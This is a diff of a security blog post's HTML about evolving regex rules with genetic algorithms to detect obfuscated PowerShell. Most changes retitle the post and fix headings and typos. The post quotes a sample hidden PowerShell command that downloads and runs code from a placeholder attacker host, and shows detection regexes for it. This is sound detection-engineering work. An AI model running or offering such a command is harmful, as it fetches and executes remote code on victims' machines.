@@ -21,7 +21,7 @@
 <meta
   name="description"
   content="
-    Can a Computer Evolve Its Own Detection Rules? Teaching a machine to evolve it&rsquo;s own regex patterns that catch obfuscated PowerShell Prologue: a video, …
+    Can a Computer Evolve Its Own Detection Rules - (Not just Throwing LLM at problem)? Prologue: a video, eleven years ago The inspiration for this project was …
   
   ">
 
@@ -37,7 +37,7 @@
 
 <meta property="og:type" content="article">
 <meta property="og:title" content="Why Mario inspired me to poke around genetic regex evolution | Blog">
-<meta property="og:description" content="Can a Computer Evolve Its Own Detection Rules? Teaching a machine to evolve it&rsquo;s own regex patterns that catch obfuscated PowerShell Prologue: a video, …">
+<meta property="og:description" content="Can a Computer Evolve Its Own Detection Rules - (Not just Throwing LLM at problem)? Prologue: a video, eleven years ago The inspiration for this project was …">
 <meta property="og:url" content="https://Pr0kythera.github.io/posts/genetic-regex/">
 <meta property="og:site_name" content="Blog"><meta property="og:image" content="https://example.com/avatar.jpg">
   <meta property="og:image:width" content="1200">
@@ -47,7 +47,7 @@
     content="2026-10-21T21:54:51Z">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="Why Mario inspired me to poke around genetic regex evolution | Blog">
-<meta name="twitter:description" content="Can a Computer Evolve Its Own Detection Rules? Teaching a machine to evolve it&rsquo;s own regex patterns that catch obfuscated PowerShell Prologue: a video, …"><meta name="twitter:image" content="https://example.com/avatar.jpg">
+<meta name="twitter:description" content="Can a Computer Evolve Its Own Detection Rules - (Not just Throwing LLM at problem)? Prologue: a video, eleven years ago The inspiration for this project was …"><meta name="twitter:image" content="https://example.com/avatar.jpg">
 
 <script type="application/ld+json">
 
@@ -60,7 +60,7 @@
 
 
 
-"{\"@context\":\"https://schema.org\",\"@type\":\"BlogPosting\",\"author\":{\"@type\":\"Person\",\"email\":\"contact.prokythera@gmail.com\",\"name\":\"Blog\"},\"dateModified\":\"2026-10-21T21:54:51Z\",\"datePublished\":\"2026-10-21T21:54:51Z\",\"description\":\"Can a Computer Evolve Its Own Detection Rules? Teaching a machine to evolve it\\u0026rsquo;s own regex patterns that catch obfuscated PowerShell Prologue: a video, …\",\"headline\":\"Why Mario inspired me to poke around genetic regex evolution\",\"image\":\"https://example.com/avatar.jpg\",\"mainEntityOfPage\":{\"@id\":\"https://Pr0kythera.github.io/posts/genetic-regex/\",\"@type\":\"WebPage\"},\"publisher\":{\"@type\":\"Organization\",\"logo\":{\"@type\":\"ImageObject\",\"url\":\"https://example.com/avatar.jpg\"},\"name\":\"Blog\"}}"</script>
+"{\"@context\":\"https://schema.org\",\"@type\":\"BlogPosting\",\"author\":{\"@type\":\"Person\",\"email\":\"contact.prokythera@gmail.com\",\"name\":\"Blog\"},\"dateModified\":\"2026-10-21T21:54:51Z\",\"datePublished\":\"2026-10-21T21:54:51Z\",\"description\":\"Can a Computer Evolve Its Own Detection Rules - (Not just Throwing LLM at problem)? Prologue: a video, eleven years ago The inspiration for this project was …\",\"headline\":\"Why Mario inspired me to poke around genetic regex evolution\",\"image\":\"https://example.com/avatar.jpg\",\"mainEntityOfPage\":{\"@id\":\"https://Pr0kythera.github.io/posts/genetic-regex/\",\"@type\":\"WebPage\"},\"publisher\":{\"@type\":\"Organization\",\"logo\":{\"@type\":\"ImageObject\",\"url\":\"https://example.com/avatar.jpg\"},\"name\":\"Blog\"}}"</script>
 
 
 
@@ -284,7 +284,7 @@
             stroke-width="2"
             d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
         </svg>
-        5654 words
+        5635 words
       </span>
     
 
@@ -309,8 +309,7 @@
       </header>
 
       <div class="post-content-main">
-        <h1 id="can-a-computer-evolve-its-own-detection-rules">Can a Computer Evolve Its Own Detection Rules?</h1>
-<h3 id="teaching-a-machine-to-evolve-its-own-regex-patterns-that-catch-obfuscated-powershell">Teaching a machine to evolve it&rsquo;s own regex patterns that catch obfuscated PowerShell</h3>
+        <h1 id="can-a-computer-evolve-its-own-detection-rules---not-just-throwing-llm-at-problem">Can a Computer Evolve Its Own Detection Rules - (Not just Throwing LLM at problem)?</h1>
 <hr>
 <h2 id="prologue-a-video-eleven-years-ago">Prologue: a video, eleven years ago</h2>
 <p>The inspiration for this project was drawn many moons ago from a YouTube video: <strong>MarI/O</strong>
@@ -318,18 +317,19 @@
 <p>That was my first introduction to genetic algorithms, and the idea got lodged in my head like the Belgian hit techno single; Pump up the Jam. A computer finding a solution by trial and a lot of error, selection and breeding. For a long while now i&rsquo;ve wanted to direct that same idea at my own field - detection engineering. Not necessarily for any other reason but curiosity, which lets face it is often the best reason lest you be of feline persuasion.</p>
 <p>Two things make <em>attempting</em> that far easier in 2026 than in 2015. Firstly, for good or bad the bar for creating such project has fallen to the floor, a capable LLM lowers the barrier to entry enormously. Slop or not the ability to accelerate projects to the point of getting answers and reasoning through the findings, problems and challenges is nothing short of revolutionary. With the normal caveats that having reasonable domain knowledge and checking the LLM&rsquo;s output is rather important. That being said the new frontier models as of Autumn 2026 are getting frighteningly good at producing code.</p>
 <hr>
-<h2 id="0-the-whole-story-in-a-few-sentences-paragraphs">0. The whole story in a few sentences.. paragraphs</h2>
-<p>To frame this entire premise.</p>
-<p>Attackers obfuscate PowerShell so the simple &ldquo;| where process_name contains &ldquo;Invoke-Expression&rdquo; detections miss it.</p>
+<h2 id="0-the-whole-story-in-a-few-sentences-or-paragraphs">0. The whole story in a few sentences or paragraphs</h2>
+<p>To frame this entire premise. Attackers often obfuscate PowerShell, among other things so the simple
+<code>&quot;| where process_name contains &quot;Invoke-Expression&quot;</code> detections will miss it.</p>
 <p>The question this blog is attempting to answer is if we throw this obfuscation problem into a class of Machine Learning that uses Genetic Algorithms can it find a solution to detect against adversarial obfuscation patterns?</p>
-<p>In short we managed it with some obsticals along the way. The impatient reader can close this now, curiosity satiated. Our system breeds a rule that beats the dumb baseline, but it hits two separate walls along the  way.</p>
-<p><strong>Wall 1</strong> is getting stuck on a &ldquo;good enough&rdquo; rule: we got past it with simply waitinf for more iterarions. Then after doing what a far more sensible person would have started with.. <strong>perform a literature review</strong> We found a far more reliably and ~4x faster by borrowing a selection trick from the research literature (lexicase selection).</p>
+<p>In short we managed it with some obstacles along the way. The impatient reader can close this now, curiosity satiated. Our system breeds a rule that beats the dumb baseline, but it hits two separate walls along the  way.</p>
+<p><strong>Wall 1</strong> is getting stuck on a &ldquo;good enough&rdquo; rule: we got past it with simply waiting for more iterations. Then after doing what a far more sensible person would have started with.. <strong>perform a literature review</strong> We found a far more reliably and ~4x faster by borrowing a selection trick from the research literature (lexicase selection).</p>
 <p><strong>Wall 2</strong> Was a bit more cumbersome to clamber over: the computer cannot assemble the <em>structure</em> needed to see through the obfuscation, even when we hand it the exact missing piece. We pinned that down by ruling out every other explanation, one experiment at a time. Until I thought rather than let the poor thing suffer by itself I myself could lend an &ldquo;expert&rdquo; hand. Without going into the weeds I&rsquo;ve written a rather effective detection that identifies Obfuscation in the past and a key component was rather than attempting to boil the ocean with one regex attempting to do everything, instead splitting the work up over twelve small detectors with a weighted score.</p>
-<p>Which raised the unsuprising finding that it works when you engage your brain and work out ways to decompose the problem and fails when you hand it the whole thing with little to no direction to the AI. Which most of us paying attention already knew and it&rsquo;s lovely to know my human brain still has value.</p>
+<p>Which raised the unsurprising finding that it works when you engage your brain and work out ways to decompose the problem and fails when you hand it the whole thing with little to no direction to the AI. Which most of us paying attention already knew and it&rsquo;s lovely to know my human brain still has value.</p>
 <hr>
-<h2 id="1-a-familiar-problem">1. A familiar problem</h2>
+<h2 id="1-what-is-likely-a-familiar-problem">1. What is likely a familiar problem</h2>
 <p>A malicious PowerShell download-and-run command might look like this:</p>
-<pre tabindex="0"><code>powershell -nop -w hidden -Command &#34;Invoke-Expression ((New-Object Net.WebClient).DownloadString(&#39;http://evil.example/p&#39;))&#34;
+<pre tabindex="0"><code>
+powershell -nop -w hidden -Command &#34;Invoke-Expression ((New-Object Net.WebClient).DownloadString(&#39;http://evil.example/p&#39;))&#34;
 </code></pre><p>The tell-tale pieces:</p>
 <ul>
 <li><code>Invoke-Expression</code> (run this text as code), <code>DownloadString</code> (pull it off the internet),</li>
@@ -383,15 +383,16 @@
 <p>A plain string search (<code>grep &quot;Invoke-Expression&quot;</code>) catches <em>none</em> of these except the untouched original. A skilled analyst can write a cleverer search that ignores the junk. But can we get a computer to <em>invent</em> that smarter search on its own?**</p>
 <p>In other words, can I automate myself out of a job.</p>
 <hr>
-<h2 id="2-the-tool-were-evolving-a-regex">2. The tool we&rsquo;re evolving: a regex</h2>
+<h2 id="2-the-tool-were-evolving-regex">2. The tool we&rsquo;re evolving: Regex</h2>
 <p>A <strong>regex</strong> (regular expression) is a search pattern. Most people in security have written one. And if your anything like me have to google the pattern matching rules each time you do.</p>
 <p>The anti-obfuscation technique, written as a regex, is to allow &ldquo;junk&rdquo; between each required letter. Where a naive search is just <code>iex</code>, an analyst writes something like:</p>
-<pre tabindex="0"><code>i[`&#39;&#34;+\s]*e[`&#39;&#34;+\s]*x
+<pre tabindex="0"><code>
+i[`&#39;&#34;+\s]*e[`&#39;&#34;+\s]*x
 </code></pre><p>Read that as: &ldquo;an <code>i</code>, then any amount of backtick/quote/plus/space junk, then an <code>e</code>, then more
 junk, then an <code>x</code>.&rdquo; That one pattern catches <code>iex</code>, <code>i`ex</code>, <code>('i'+'ex')</code>, and so on. This can be refered to as noise skipping <strong>noise skipping</strong>, and the junk characters (backtick, quotes, <code>+</code>, whitespace) we can call the <strong>noise</strong>.</p>
 <p>So the thing we want the computer to produce is a regex pattern. The question is how do we get a computer to <em>invent</em> a good one itself without us telling it the answer?</p>
 <hr>
-<h2 id="3-evolution-applied-to-search-rules">3. Evolution, applied to search rules</h2>
+<h2 id="3-evolution">3. Evolution</h2>
 <p>The technique is a <strong>genetic algorithm</strong> which was the method behind the MarI/O video from the prologue.</p>
 <p>To use an analogy; <em>sorry Dawin Tortoise racing is commonly frowned upon so I&rsquo;ve ran with horse racing</em>.</p>
 <p>If you want faster racehorses, you can&rsquo;t calculate the perfect horse.</p>
@@ -446,7 +447,6 @@ As ever the friends we made was the learning along the way.</p>
 
 </blockquote>
 <hr>
-<h2 id="4-testing-and-hacking-but-not-in-the-way-you-know-it">4. Testing and Hacking, but not in the way you know it!</h2>
 <h3 id="41-generating-data">4.1 Generating data</h3>
 <p>We generated the malicious examples from templates, applying the obfuscation techniques above at <strong>six escalating levels</strong>:</p>
 <p>(L0 = untouched, up to L5 = heavily scrambled / base64).</p>
@@ -456,12 +456,12 @@ As ever the friends we made was the learning along the way.</p>
 <p>As with many things in life you can&rsquo;t tell if a score is good without having something to compare it against. We use two <strong>baselines</strong> these are rules we did <em>not</em> evolve:</p>
 <ul>
 <li>
-<p><strong>keyword</strong>  -  the simpliest possible rule: the literal indicator as a plain string (<code>iex</code>,
+<p><strong>keyword:</strong>  The simplest possible rule: the literal indicator as a plain string (<code>iex</code>,
 <code>invoke-expression</code>). Catches the un-obfuscated spelling and nothing else. This is the <strong>floor</strong>:
 if evolution can&rsquo;t beat this, it has learned nothing.</p>
 </li>
 <li>
-<p><strong>expert</strong>  -  the noise-skipping pattern from Section 2, the best a skilled analyst who understands
+<p><strong>expert:</strong>  The noise-skipping pattern from Section 2, the best a skilled analyst who understands
 the obfuscation would hand-write. This is the <strong>ceiling</strong>: it catches everything that is still
 <em>visible</em> in the text, so no raw-text regex can beat it.</p>
 </li>
@@ -514,7 +514,7 @@ that flags nothing scores 95%+ accuracy while catching nothing.</p>
 <h3 id="exp-4-does-it-just-need-more-time">Exp 4 Does it just need more time?</h3>
 <p>We provided it <strong>4x more generations</strong>. One run in three broke through: it beat the keyword floor (<strong>0.68 &gt; 0.61</strong>) and, for the first time, highlighted <strong>27 complete indicators</strong>. Watching its score over time told the story. it sat flat at ~0.50 for <em>seventy</em> generations, then a lucky breeding event (Life finds a way) in the final ten generations jumped it to 0.64. <strong>So the first wall isn&rsquo;t infinitely high; it&rsquo;s a valley the algorithm can occasionally tunnel through, given enough attempts.</strong> The breakthrough rule used <code>\w+</code> (regex for &ldquo;a run of letters/digits&rdquo;) to span across letters.
 <img src="/images/genetic-regex/exp4_EXEC_budget.png?width=200px" alt="Resize" style="max-width: 100%; height: auto; display: block;"></p>
-<h3 id="exp-5-----can-we-make-the-breakthrough-reliable-yes-----with-restarts">Exp 5  -  Can we make the breakthrough reliable? (Yes  -  with restarts.)</h3>
+<h3 id="exp-5-can-we-make-the-breakthrough-reliable">Exp 5 Can we make the breakthrough reliable?</h3>
 <p>A breakthrough that happens &ldquo;sometimes&rdquo; isn&rsquo;t a strategy for robust detections. But <em>sometimes</em> is measurable. We
 ran many independent attempts and measured the <strong>escape rate</strong> as ~<strong>36%</strong> per run at the longer budget,
 rising to ~<strong>56%</strong> with more time. That means we can turn luck into engineering. If each run succeeds 36% of the
@@ -522,7 +522,7 @@ time, running <strong>7 in parallel</strong> gives you &gt;95% odds that at leas
 <p><img src="/images/genetic-regex/exp5_EXEC_escape.png?width=200px" alt="Resize" style="max-width: 100%; height: auto; display: block;"></p>
 <p>However every single successful run topped out at the same ~0.70 all of them using that <code>\w+</code> trick. And <code>\w</code>
 matches letters and digits, <strong>not</strong> the backtick/quote/<code>+</code> noise. So while it sails through case changes it&rsquo;s very much completely blind to <code>i`ex</code> and <code>('i'+'ex')</code>. That&rsquo;s the <strong>second wall</strong>, and nothing had touched it.</p>
-<h3 id="interlude---stuck-on-a-good-enough-answer">Interlude - &ldquo;stuck on a good-enough answer&rdquo;</h3>
+<h3 id="interlude---stuck-on-a-good-but-not-great-answer">Interlude - Stuck on a good but not great answer</h3>
 <p>At this point I&rsquo;d like to point out if this was a proper research paper or anything more than a series of curious experiments a proper literature review would have been the starting point. The unsatisfactory progress I was having with these experiments can be attributed to some the oldest problems in evolutionary computing, and the MarI/O video from the
 prologue is built on one of the classic answers. MarI/O used an algorithm called <strong>NEAT</strong> (2002).</p>
 
@@ -599,7 +599,7 @@ obfuscated cases but was mediocre on easy ones got averaged out of existence.</p
 <p><img src="/images/genetic-regex/exp7_EXEC_lexicase.png?width=200px" alt="Resize" style="max-width: 100%; height: auto; display: block;"></p>
 <p>That makes the two walls cleanly separable, which is itself a useful to reflect upon: <strong>wall 1 is a selection problem and lexicase fixes it; wall 2 is an operator problem and needs a different tool.</strong></p>
 <hr>
-<h2 id="6-the-bottom-line">6. The bottom line</h2>
+<h2 id="6-preliminary-results">6. Preliminary results</h2>
 <p>Stacking the experiments up, the ~0.70 ceiling has a clean explanation, with every alternative ruled
 out:</p>
 <table>
@@ -845,19 +845,13 @@ out:</p>
       <nav class="toc-nav" aria-label="Table of contents">
         <nav id="TableOfContents">
   <ul>
-    <li><a href="#can-a-computer-evolve-its-own-detection-rules">Can a Computer Evolve Its Own Detection Rules?</a>
+    <li><a href="#can-a-computer-evolve-its-own-detection-rules---not-just-throwing-llm-at-problem">Can a Computer Evolve Its Own Detection Rules - (Not just Throwing LLM at problem)?</a>
       <ul>
-        <li>
-          <ul>
-            <li><a href="#teaching-a-machine-to-evolve-its-own-regex-patterns-that-catch-obfuscated-powershell">Teaching a machine to evolve it&rsquo;s own regex patterns that catch obfuscated PowerShell</a></li>
-          </ul>
-        </li>
         <li><a href="#prologue-a-video-eleven-years-ago">Prologue: a video, eleven years ago</a></li>
-        <li><a href="#0-the-whole-story-in-a-few-sentences-paragraphs">0. The whole story in a few sentences.. paragraphs</a></li>
-        <li><a href="#1-a-familiar-problem">1. A familiar problem</a></li>
-        <li><a href="#2-the-tool-were-evolving-a-regex">2. The tool we&rsquo;re evolving: a regex</a></li>
-        <li><a href="#3-evolution-applied-to-search-rules">3. Evolution, applied to search rules</a></li>
-        <li><a href="#4-testing-and-hacking-but-not-in-the-way-you-know-it">4. Testing and Hacking, but not in the way you know it!</a>
+        <li><a href="#0-the-whole-story-in-a-few-sentences-or-paragraphs">0. The whole story in a few sentences or paragraphs</a></li>
+        <li><a href="#1-what-is-likely-a-familiar-problem">1. What is likely a familiar problem</a></li>
+        <li><a href="#2-the-tool-were-evolving-regex">2. The tool we&rsquo;re evolving: Regex</a></li>
+        <li><a href="#3-evolution">3. Evolution</a>
           <ul>
             <li><a href="#41-generating-data">4.1 Generating data</a></li>
             <li><a href="#42-two-measures-the-floor-and-the-ceiling">4.2 Two measures: the floor and the ceiling</a></li>
@@ -868,12 +862,12 @@ out:</p>
           <ul>
             <li><a href="#exp-1-the-first-run-it-stalls-below-the-baseline">Exp 1 The first run: it stalls <em>below</em> the baseline</a></li>
             <li><a href="#exp-4-does-it-just-need-more-time">Exp 4 Does it just need more time?</a></li>
-            <li><a href="#exp-5-----can-we-make-the-breakthrough-reliable-yes-----with-restarts">Exp 5  -  Can we make the breakthrough reliable? (Yes  -  with restarts.)</a></li>
-            <li><a href="#interlude---stuck-on-a-good-enough-answer">Interlude - &ldquo;stuck on a good-enough answer&rdquo;</a></li>
+            <li><a href="#exp-5-can-we-make-the-breakthrough-reliable">Exp 5 Can we make the breakthrough reliable?</a></li>
+            <li><a href="#interlude---stuck-on-a-good-but-not-great-answer">Interlude - Stuck on a good but not great answer</a></li>
             <li><a href="#exp-7-protecting-the-specialists-lexicase-selection">Exp 7 Protecting the specialists: lexicase selection</a></li>
           </ul>
         </li>
-        <li><a href="#6-the-bottom-line">6. The bottom line</a>
+        <li><a href="#6-preliminary-results">6. Preliminary results</a>
           <ul>
             <li><a href="#71-where-experiments-1-7-left-us">7.1 Where Experiments 1-7 left us</a></li>
             <li><a href="#72-the-potential-solution-stop-asking-one-regex-to-do-everything">7.2 The potential solution: stop asking one regex to do everything</a></li>
